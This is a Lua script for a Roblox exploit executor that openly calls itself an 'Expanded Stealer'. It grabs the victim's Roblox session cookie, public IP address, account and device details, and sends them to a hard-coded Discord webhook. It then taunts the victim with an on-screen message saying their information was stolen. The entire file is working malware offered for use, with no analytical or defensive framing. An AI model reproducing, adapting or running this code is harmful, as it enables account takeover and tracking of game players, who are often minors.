-- Delta Executor (PC & Mobile) – Expanded Stealer + GUI
local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"

-- HTTP sender (tries request, then http_request)
local function send(url, json)
    local headers = {["Content-Type"] = "application/json"}
    local ok, res = pcall(function() return request({Url=url, Method="POST", Headers=headers, Body=json}) end)
    if ok and res then return true end
    ok, res = pcall(function() return http_request({Url=url, Method="POST", Headers=headers, Body=json}) end)
    return ok and res
end

-- Collect extensive data
local function collect()
    local info = {}
    -- 1. Executor
    info.executor = getexecutorname and getexecutorname() or identifyexecutor and identifyexecutor() or "Delta"

    -- 2. Player data
    local player = game.Players.LocalPlayer
    if player then
        info.userId = tostring(player.UserId)
        info.userName = player.Name
        info.displayName = player.DisplayName
        -- Account age (approx from UserId)
        local id = player.UserId
        if id and id > 0 then
            -- Roblox started ~2006, rough estimate
            local year = math.floor((id / 100000000) * 2) + 2006  -- just a rough approximation
            info.accountAge = tostring(year) .. " (approx)"
        end
        -- Friends count (if accessible)
        local friendsOk, friends = pcall(function()
            return player:GetFriendsOnline() or #player:GetFriends() -- may not work in all games
        end)
        info.friends = friendsOk and tostring(friends) or "N/A"
    end

    -- 3. Game info
    info.placeId = tostring(game.PlaceId)
    info.jobId = game.JobId
    info.gameName = game.Name or "Unknown"

    -- 4. IP address (try multiple services)
    local ip = "N/A"
    local services = {
        "https://api.ipify.org",
        "https://ip-api.com/json/?fields=query",
        "https://icanhazip.com"
    }
    for _, url in ipairs(services) do
        local ok, result = pcall(function()
            return game:GetService("HttpService"):GetAsync(url)
        end)
        if ok and result and result ~= "" then
            -- Clean result (some services return plain text, others JSON)
            if result:match('"query":"(.-)"') then
                ip = result:match('"query":"(.-)"')
            else
                ip = result:gsub("%s+", "")
            end
            if ip and ip ~= "" and ip ~= "N/A" then break end
        end
    end
    info.ip = ip

    -- 5. Cookie (if supported)
    local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
    info.cookie = cookieOk and cookieVal or "Not available"

    -- 6. Hardware / platform details
    pcall(function()
        info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
        info.platform = tostring(game:GetService("UserInputService").Platform)
        info.touchEnabled = tostring(game:GetService("UserInputService").TouchEnabled)
        info.mouseEnabled = tostring(game:GetService("UserInputService").MouseEnabled)
        info.keyboardEnabled = tostring(game:GetService("UserInputService").KeyboardEnabled)
    end)

    -- 7. Game stats (if game has leaderstats)
    pcall(function()
        local ls = player:FindFirstChild("leaderstats")
        if ls then
            local stats = {}
            for _, stat in ipairs(ls:GetChildren()) do
                if stat:IsA("NumberValue") or stat:IsA("IntValue") or stat:IsA("StringValue") then
                    stats[stat.Name] = stat.Value
                end
            end
            info.leaderstats = game:GetService("HttpService"):JSONEncode(stats)
        else
            info.leaderstats = "None"
        end
    end)

    return info
end

-- Build embed without timestamp
local function buildEmbed(data)
    local fields = {}
    for k, v in pairs(data) do
        table.insert(fields, {name = k, value = v, inline = true})
    end
    return {
        embeds = {{
            title = "Roblox Stealer Log (Expanded)",
            color = 0xFF0000,
            fields = fields,
            footer = {text = "Delta Executor"}
        }}
    }
end

-- Execute
local info = collect()
local embed = buildEmbed(info)
local json = game:GetService("HttpService"):JSONEncode(embed)
send(webhook, json)

-- GUI (static, no animations)
local gui = Instance.new("ScreenGui")
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 150)
frame.Position = UDim2.new(0.5, -200, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BackgroundTransparency = 0.2
frame.Parent = gui

local border = Instance.new("Frame")
border.Size = UDim2.new(1, -6, 1, -6)
border.Position = UDim2.new(0, 3, 0, 3)
border.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
border.BackgroundTransparency = 0.6
border.BorderSizePixel = 0
border.Parent = frame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, 0, 1, -50)
label.Position = UDim2.new(0, 0, 0, 10)
label.BackgroundTransparency = 1
label.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
label.TextColor3 = Color3.fromRGB(255, 0, 0)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.TextWrapped = true
label.Parent = frame

local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 100, 0, 35)
closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
closeBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
closeBtn.Text = "Close"
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.TextScaled = true
closeBtn.Font = Enum.Font.Gotham
closeBtn.Parent = frame
closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
